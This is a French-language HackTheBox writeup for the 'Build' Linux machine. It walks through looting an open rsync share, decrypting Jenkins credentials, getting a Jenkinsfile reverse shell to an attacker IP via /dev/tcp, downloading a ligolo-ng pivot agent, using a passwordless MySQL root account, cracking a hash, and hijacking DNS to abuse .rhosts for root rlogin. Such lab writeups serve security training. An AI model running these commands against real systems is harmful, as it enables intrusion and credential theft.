---
title: Build
date: 2025-12-11 10:28:41
categories: ["Writeups", "Hackthebox", "Machines"]
tags: ["Linux", "Medium", "PowerDNS"]
---

**Build** est une machine Linux classée comme facile. Elle implique la lecture de fichiers sensibles depuis des partages **rsync** non authentifiés, ce qui mène à l'exposition d'un mot de passe Jenkins chiffré. Je parvient à déchiffrer ce mot de passe, ce qui me permet d'accéder à **Gitea**. Le dépôt appartenant à l'administrateur sur **Gitea** dispose d'un `webhook` configuré, permettant d'obtenir une exécution de code arbitraire et un shell dans le conteneur Docker. Ce conteneur Docker a accès à **MySQL** et `PowerDNS`, qui s'exécutent tous deux dans un autre conteneur sur le même réseau Docker. Le conteneur a également un fichier monté nommé **.rhosts**, qui est aussi monté dans le répertoire racine de la machine hôte. **MySQL** est mal configuré et n'a pas de mot de passe pour le compte root, ce qui permet à un attaquant de prendre le contrôle total de la base de données. Une fois le hash de l'administrateur craqué et connecter à `PowerDNS`, je modifie l'enregistrement DNS **intern/admin** pour le rediriger vers ma propre machine. En supposant que le même fichier **.rhosts** est également monté sur la machine hôte, cela me permet d'obtenir une session root via le protocole **Remote Shell Protocol (RSH)**.

# Énumération 
## Nmap

Je lance un scan tcp complet avec `rustscan`
```sh
rustscan -a 10.129.234.169 -u 5000 -- -sV -sC -oN fulltcpscan.txt
```

Il y a 7 ports ouverts : SSH (22), DNS  (53), R-SERVICES (512,513,514), RSync (874) et HTTP (3000).
```shell
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 472173e26b96cdf91311af40c84dd67f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEwDujdYYBlK34trPdE896KV0Q89NkU0P+PNYKboWAXcOIzRxia7eKQnOZMDcbpjdpUgTlee4VpIiQwwKLfGLqg=
|   256 2b5ebaf372d3b309df25412909f47bf5 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAhXu4iRkeWtuE4+/w9QwJeecIUqhFrfTiQsmNatD9LG
53/tcp   open  domain  syn-ack ttl 62 PowerDNS
| dns-nsid:
|   NSID: pdns (70646e73)
|_  id.server: pdns
512/tcp  open  exec    syn-ack ttl 63 netkit-rsh rexecd
513/tcp  open  login?  syn-ack ttl 63
514/tcp  open  shell   syn-ack ttl 63 Netkit rshd
873/tcp  open  rsync   syn-ack ttl 63 (protocol version 31)
3000/tcp open  ppp?    syn-ack ttl 62
| fingerprint-strings:
|   GenericLines, Help, RTSPRequest:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
```

## DNS - TCP 53

Je ne trouve aucun nom de domaine ni avec `nslookup` ni avec `dnsenum`.
```sh
/workspace/Build
❯ nslookup 10.129.234.169
** server can't find 169.234.129.10.in-addr.arpa: NXDOMAIN

/workspace/Build
❯ dnsenum 10.129.234.169
dnsenum VERSION:1.2.6

-----   10.129.234.169   -----


Host's addresses:
__________________



Name Servers:
______________

 10.129.234.169 NS record query failed: NXDOMAIN
```

## HTTP - TCP 3000

Le site semble être du Gitea.
![](/imagesBuild/Build-1.png)

Il existe un repo `dev` de l'utilisateur `buildadm`.
![](/images/Build/Build-2.png)

Ce repo contient un fichier Jenkins.
![](/images/Build/Build-3.png)

C'est un fichier qui n'exécute qu'une commande système `/bin/true`.
```
pipeline {
    agent any

    stages {
        stage('Do nothing') {
            steps {
                sh '/bin/true'
            }
        }
    }
}
```

La version de Gitea ne nous permettra pas de trouver de vulnérabilité exploitable ici.
![](/images/Build/Build-4.png)


## RSync - TCP 874

Il existe un partage `backups`  sur le port RSync.
```sh
/workspace/Build
❯ rsync 10.129.234.169::
backups         backups
```

Je télécharge le contenu de ce partage. Il n'y a qu'une archive `Jenkins.tar.gz`.
```sh
/workspace/Build   100s
❯ rsync -av rsync://10.129.234.169/backups/ ./backups/rsync: [receiver] write error: Broken pipe (32)
rsync error: received SIGINT, SIGTERM, or SIGHUP (code 20) at io.c(1701) [sender=3.2.7]

receiving incremental file list
created directory ./backups
./
jenkins.tar.gz

sent 50 bytes  received 376,381,276 bytes  3,567,595.51 bytes/sec
total size is 376,289,280  speedup is 1.00
```

# Shell en tant que root sur docker
## Énumérer le backup

J'extrais le contenu de l'archive.
```sh
tar xvf jenkins.tar.gz
```

Je trouve un mot de passe hashé dans le fichier `jenkins_configuration/users/admin_8569439066427679502/config.xml`.
```sh
/workspace/Build/backups   100s
❯ grep -iR "password"
--[snip]--
jenkins_configuration/users/admin_8569439066427679502/config.xml:      <passwordHash>#jbcrypt:$2a$10$PaXdGyit8MLC9CEPjgw15.6x0GOIZNAk2gYUTdaOB6NN/9CPcvYrG</passwordHash>
```

Je vois la configuration des différentes applications énumérées.
```sh
/workspace/Build/backups
❯ grep -iR 'build.vl'
grep: jenkins.tar.gz: binary file matches
jenkins_configuration/jobs/build/state.xml:          <avatar>http://build.vl:3000/avatar/204239236134d8e6eb156992dd11c53e</avatar>
jenkins_configuration/org.jenkinsci.plugin.gitea.servers.GiteaServers.xml:      <displayName>gitea.build.vl</displayName>
jenkins_configuration/jenkins.model.JenkinsLocationConfiguration.xml:  <jenkinsUrl>http://build.vl:5000/</jenkinsUrl>
jenkins_configuration/users/admin_8569439066427679502/config.xml:      <emailAddress>admin@build.vl</emailAddress>
```

J'ajoute le nom de domaine ainsi que le sous domaine dans le fichier `/etc/hosts`.
```sh
echo "10.129.234.169 build.vl gitea.build.vl" | tee -a /etc/hosts
```

Les fichiers `jenkins_configuration/secret.key` et `jenkins_configuration/config.xml` contiennent des informations qui ne nous serons pas très utiles pour la suite.
```sh
/workspace/Build/backups
❯ cat jenkins_configuration/secret.key
7ab384851b99c61462f5fb02dda5bc13a6ff84bba5e89fafa45f914c7b62f581#                                                                                           
/workspace/Build/backups
❯ cat jenkins_configuration/config.xml
<?xml version='1.1' encoding='UTF-8'?>
<hudson>
  <disabledAdministrativeMonitors>
    <string>jenkins.diagnostics.SecurityIsOffMonitor</string>
    <string>jenkins.diagnostics.ControllerExecutorsNoAgents</string>
    <string>hudson.util.DoubleLaunchChecker</string>
  </disabledAdministrativeMonitors>
  <version>2.441</version>
  <numExecutors>2</numExecutors>
  <mode>NORMAL</mode>
  <useSecurity>true</useSecurity>
  <authorizationStrategy class="hudson.security.AuthorizationStrategy$Unsecured"/>
  <securityRealm class="hudson.security.SecurityRealm$None"/>
  <disableRememberMe>false</disableRememberMe>
  <projectNamingStrategy class="jenkins.model.ProjectNamingStrategy$DefaultProjectNamingStrategy"/>
  <workspaceDir>${JENKINS_HOME}/workspace/${ITEM_FULL_NAME}</workspaceDir>
  <buildsDir>${ITEM_ROOTDIR}/builds</buildsDir>
  <jdks/>
  <viewsTabBar class="hudson.views.DefaultViewsTabBar"/>
  <myViewsTabBar class="hudson.views.DefaultMyViewsTabBar"/>
  <clouds/>
  <quietPeriod>5</quietPeriod>
  <scmCheckoutRetryCount>0</scmCheckoutRetryCount>
  <views>
    <hudson.model.AllView>
      <owner class="hudson" reference="../../.."/>
      <name>all</name>
      <filterExecutors>false</filterExecutors>
      <filterQueue>false</filterQueue>
      <properties class="hudson.model.View$PropertyList"/>
    </hudson.model.AllView>
  </views>
  <primaryView>all</primaryView>
  <slaveAgentPort>50000</slaveAgentPort>
  <label></label>
  <crumbIssuer class="hudson.security.csrf.DefaultCrumbIssuer">
    <excludeClientIPFromCrumb>false</excludeClientIPFromCrumb>
  </crumbIssuer>
  <nodeProperties/>
  <globalNodeProperties/>
  <nodeRenameMigrationNeeded>false</nodeRenameMigrationNeeded>
</hudson>#
```

En énumérant, je trouve le fichier `jenkins_configuration/jobs/build/config.xml` qui contient les identifiants chiffrés des utilisateurs. Je trouve aussi les fichiers `jenkins_configuration/secrets/master.key` et `jenkins_configuration/secrets/hudson.util.Secret` qui permettent de déchiffrer le fichier `config.xml` avec l'outil [Jenkins-credentials-decryptor](https://github.com/hoto/jenkins-credentials-decryptor). Voici la commande pour le télécharger.
```sh
curl -L \
  "https://github.com/hoto/jenkins-credentials-decryptor/releases/download/1.2.2/jenkins-credentials-decryptor_1.2.2_$(uname -s)_$(uname -m)" \
   -o jenkins-credentials-decryptor

chmod +x jenkins-credentials-decryptor
```

J'utilise alors l'outils et je trouve les identifiants de l'utilisateur `buildadm`.
```sh
/workspace/Build/backups
❯ ./jenkins-credentials-decryptor -m jenkins_configuration/secrets/master.key -s jenkins_configuration/secrets/hudson.util.Secret -c jenkins_configuration/jobs/build/config.xml
[
  {
    "id": "e4048737-7acd-46fd-86ef-a3db45683d4f",
    "password": "Git1234!",
    "username": "buildadm"
  }
]
```

Malheureusement, ils ne permettent pas une connexion ssh à la machine.
```sh
/workspace/Build
❯ nxc ssh 10.129.234.169 -u buildadm -p 'Git1234!'
SSH         10.129.234.169  22     10.129.234.169   [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.13
SSH         10.129.234.169  22     10.129.234.169   [-] buildadm:Git1234!
```

## Connexion à Gitea

Par contre, ce sont les identifiants Gitea valides.
![](/images/Build/Build-5.png)

## Reverse shell

Je peux maintenant modifier le fichier Jenkins se trouvant dans le repo dev permettant d'exécuter des commandes systèmes. Je remplace donc le contenu du script avec une commande reverse shell basique et j'enregistre le fichier
```
bash -c "bash -i >& /dev/tcp/10.10.16.48/9001 0>&1"
```
![](/images/Build/Build-6.png)

Avant l'enregistrement du fichier, j'ai démarré mon listener. Donc après enregistrement du fichier, quelques secondes plus tard, j'obtiens un reverse shell en tant que root sur un docker.
![](/images/Build/Build-7.png)

Je peux alors récupérer le 1er flag.
```sh
root@5ac6c7d6fb8e:~# ls
user.txt
root@5ac6c7d6fb8e:~# cat user.txt
466*****************************
```

# Shell en tant que root
## Énumération 

J'énumère alors le réseau de la machine. La commande `ping` n'étant pas installée sur la machine, je vais faire du pivoting pour accéder au réseau interne.
```sh
root@5ac6c7d6fb8e:/tmp# cat /etc/hosts
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
172.18.0.3      5ac6c7d6fb8e
```

Sur ma machine je démarre le serveur ligolo-ng.
```
ligolo-ng -selfcert
```

J'uploade alors un agent ligolo-ng pour le pivoting.
```sh
wget 10.10.16.48/agent -O /tmp/agent
chmod +x /tmp/agent
/tmp/agent -ignore-cert -connect 10.10.16.48:11601 &
```

Une fois la connexion établie avec le serveur, j'execute la commande `session` afin de choisir la session établie. Puis je peux exécuter la commande `autoroute` et suivre les étapes de création du tunnel. Sinon je peux les faire manuellement avec les commandes suivantes.
```sh
ifcreate --name build
route_add --name build --route 172.18.0.0/24
tunnel_start --tun build
```

Je faire alors du ping sweep et je trouve 5 autres machines. 
```sh
/workspace/Build
❯ for i in {1..254} ;do (ping -c 1 172.18.0.$i | grep "bytes from" &) ;done
64 bytes from 172.18.0.1: icmp_seq=1 ttl=64 time=35.7 ms
64 bytes from 172.18.0.2: icmp_seq=1 ttl=64 time=33.4 ms
64 bytes from 172.18.0.6: icmp_seq=1 ttl=64 time=57.5 ms
64 bytes from 172.18.0.4: icmp_seq=1 ttl=64 time=63.1 ms
64 bytes from 172.18.0.3: icmp_seq=1 ttl=64 time=65.9 ms
64 bytes from 172.18.0.5: icmp_seq=1 ttl=64 time=60.3 ms
```

Je mets les adresses IP dans un fichier **hosts.txt** et je lance un scan **nmap**.
```sh
nmap -iL hosts.txt --vv
```

```sh
Nmap scan report for 172.18.0.1
PORT     STATE SERVICE         REASON
22/tcp   open  ssh             syn-ack ttl 64
53/tcp   open  domain          syn-ack ttl 64
512/tcp  open  exec            syn-ack ttl 64
513/tcp  open  login           syn-ack ttl 64
514/tcp  open  shell           syn-ack ttl 64
873/tcp  open  rsync           syn-ack ttl 64
3000/tcp open  ppp             syn-ack ttl 64
3306/tcp open  mysql           syn-ack ttl 64
8081/tcp open  blackice-icecap syn-ack ttl 64

Nmap scan report for 172.18.0.2
Host is up, received reset ttl 64 (0.054s latency).
Scanned at 2025-12-07 20:56:12 CET for 3s
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 64
3000/tcp open  ppp     syn-ack ttl 64

Nmap scan report for 172.18.0.6
Host is up, received reset ttl 64 (0.081s latency).
Scanned at 2025-12-07 20:56:12 CET for 3s
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64

Nmap scan report for 172.18.0.4
Host is up, received reset ttl 64 (0.061s latency).
Scanned at 2025-12-07 20:56:12 CET for 3s
Not shown: 999 closed tcp ports (reset)
PORT     STATE SERVICE REASON
3306/tcp open  mysql   syn-ack ttl 64

Nmap scan report for 172.18.0.3
Host is up, received reset ttl 64 (0.065s latency).
Scanned at 2025-12-07 20:56:12 CET for 3s
Not shown: 998 closed tcp ports (reset)
PORT      STATE SERVICE    REASON
8080/tcp  open  http-proxy syn-ack ttl 64
50000/tcp open  ibm-db2    syn-ack ttl 64

Nmap scan report for 172.18.0.5
Host is up, received reset ttl 64 (0.096s latency).
Scanned at 2025-12-07 20:56:12 CET for 3s
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE         REASON
53/tcp   open  domain          syn-ack ttl 64
8081/tcp open  blackice-icecap syn-ack ttl 64
```

## Connexion MySQL

Je me connecte à MySQL sur la machine **172.18.0.1**. Je trouve la base de données `powerdnsadmin`.
```sh
/workspace/Build   9s
❯ mysql -u root -h 172.18.0.1 -p
Enter password:
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 42
Server version: 11.3.2-MariaDB-1:11.3.2+maria~ubu2204 mariadb.org binary distribution

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| powerdnsadmin      |
| sys                |
+--------------------+
```

La table `user` contient le mot de passe chiffrer de l'utilisateur `admin`.
```sh
MariaDB [(none)]> use powerdnsadmin
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [powerdnsadmin]> show tables;
+-------------------------+
| Tables_in_powerdnsadmin |
+-------------------------+
| account                 |
| account_user            |
| alembic_version         |
| apikey                  |
| apikey_account          |
| comments                |
| cryptokeys              |
| domain                  |
| domain_apikey           |
| domain_setting          |
| domain_template         |
| domain_template_record  |
| domain_user             |
| domainmetadata          |
| domains                 |
| history                 |
| records                 |
| role                    |
| sessions                |
| setting                 |
| supermasters            |
| tsigkeys                |
| user                    |
+-------------------------+
23 rows in set (0.083 sec)

MariaDB [powerdnsadmin]> describe user;
+------------+--------------+------+-----+---------+----------------+
| Field      | Type         | Null | Key | Default | Extra          |
+------------+--------------+------+-----+---------+----------------+
| id         | int(11)      | NO   | PRI | NULL    | auto_increment |
| username   | varchar(64)  | YES  | UNI | NULL    |                |
| password   | varchar(64)  | YES  |     | NULL    |                |
| firstname  | varchar(64)  | YES  |     | NULL    |                |
| lastname   | varchar(64)  | YES  |     | NULL    |                |
| email      | varchar(128) | YES  |     | NULL    |                |
| otp_secret | varchar(16)  | YES  |     | NULL    |                |
| role_id    | int(11)      | YES  | MUL | NULL    |                |
| confirmed  | tinyint(1)   | NO   |     | NULL    |                |
+------------+--------------+------+-----+---------+----------------+
9 rows in set (0.084 sec)

MariaDB [powerdnsadmin]> select username,password,otp_secret from user;
+----------+--------------------------------------------------------------+------------+
| username | password                                                     | otp_secret |
+----------+--------------------------------------------------------------+------------+
| admin    | $2b$12$s1hK0o7YNkJGfu5poWx.0u1WLqKQIgJOXWjjXz7Ze3Uw5Sc2.hsEq | NULL       |
+----------+--------------------------------------------------------------+------------+
1 row in set (0.090 sec)
```

Je craque ce hash avec `john` et je trouve le mot de passe `winston`.
```sh
/workspace/Build
❯ john --wordlist=`fzf-wordlists` admin.hash
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 4096 for all loaded hashes
Will run 16 OpenMP threads
Note: Passwords longer than 24 [worst case UTF-8] to 72 [ASCII] truncated (property of the hash)
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
winston          (?)
1g 0:00:00:15 DONE (2025-12-07 20:58) 0.06452g/s 92.90p/s 92.90c/s 92.90C/s winston..michel
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

## Connexion à PowerDNS-Admin

Je me connecte sur le `http://172.18.0.6/login` à [PowerDNS-Admin](https://github.com/PowerDNS-Admin/PowerDNS-Admin) avec les identifiants `admin:winston`.
![](/images/Build/Build-8.png)

J'arrive alors sur l'interface administrateur de `PowerDNS-Admin`.
![](/images/Build/Build-9.png)

Le domaine `build.vl` contient plusieurs enregistrements DNS.
![](/images/Build/Build-10.png)

En revenant sur le docker, dans le répertoire personnel du root se trouve le fichier `.rhosts` qui contient deux enregistrements. Ce fichier permet aux utilisateurs venant de ces domaines de se connecter à RLogin sans mot de passe.
```sh
root@5ac6c7d6fb8e:~# ls -al
total 20
drwxr-xr-x 3 root root 4096 May  2  2024 .
drwxr-xr-x 1 root root 4096 May  9  2024 ..
lrwxrwxrwx 1 root root    9 May  1  2024 .bash_history -> /dev/null
-r-------- 1 root root   35 May  1  2024 .rhosts
drwxr-xr-x 2 root root 4096 May  1  2024 .ssh
-rw------- 1 root root   33 Apr 15  2025 user.txt
root@5ac6c7d6fb8e:~# cat .rhosts
admin.build.vl +
intern.build.vl +
```

## Empoisonnement DNS

Le domaine `admin.build.vl` n'étant pas encore enregistré, je l'enregistre et je pointe son adresse IP comme l'adresse IP de ma machine.
![](/images/Build/Build-11.png)

Donc tous les utilisateurs se trouvant sur ma machine peuvent alors se connecter à la machine sans mot de passe. Je me connecte alors en tant que l'utilisateur root et je récupère le second flag.
```sh
/workspace/Build
❯ rlogin 10.129.234.169 -l root
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-144-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun Dec  7 08:17:30 PM UTC 2025

  System load:  0.01              Processes:             189
  Usage of /:   67.3% of 9.75GB   Users logged in:       0
  Memory usage: 42%               IPv4 address for eth0: 10.129.234.169
  Swap usage:   0%

  => There is 1 zombie process.


Expanded Security Maintenance for Applications is not enabled.

1 update can be applied immediately.
1 of these updates is a standard security update.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

root@build:~# id
uid=0(root) gid=0(root) groups=0(root)
root@build:~# ls
int  root.txt  scripts  snap
root@build:~# cat root.txt
b7b1******************************
```
